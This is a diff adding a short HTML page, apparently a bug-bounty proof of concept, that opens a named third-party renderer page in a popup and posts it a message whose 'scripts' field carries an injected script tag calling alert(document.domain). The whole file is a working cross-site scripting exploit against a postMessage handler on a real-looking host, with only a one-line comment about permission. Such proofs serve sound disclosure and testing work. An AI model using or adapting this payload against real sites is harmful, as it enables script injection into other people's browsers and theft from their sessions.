@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>postMessage demo 2 with open window</title>
+</head>
+<body>
+  <button id="send">Open Page and Send Message</button>
+
+  <script>
+    const url = "https://nolan.wetransfer.net/apps/desktop-web-renderer/0.6.20/index.html?_origin=https://daemoon.me&_placement=badr"; // must be one you control or have permission for
+    let popup;
+
+
+    document.getElementById("send").addEventListener("click", () => {
+      popup = window.open(url);
+      setTimeout(() => {
+        popup.postMessage({
+          command: "ready",
+          placement: "badr",
+          scripts: ["<script>alert(document.domain)<\/script>"]
+        }, '*');
+      }, 2000);
+    });
+  </script>
+</body>
+</html>
